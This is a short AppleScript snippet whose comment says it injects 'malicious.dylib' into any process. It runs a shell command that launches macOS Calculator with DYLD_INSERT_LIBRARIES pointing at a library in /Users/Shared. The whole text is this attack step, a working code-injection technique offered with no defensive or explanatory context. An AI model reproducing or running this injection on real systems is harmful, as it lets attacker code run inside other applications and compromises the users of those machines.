-- Inject malicious.dylib into any process (e.g., Calculator)
do shell script "DYLD_INSERT_LIBRARIES=/Users/Shared/malicious.dylib /System/Applications/Calculator.app/Contents/MacOS/Calculator"
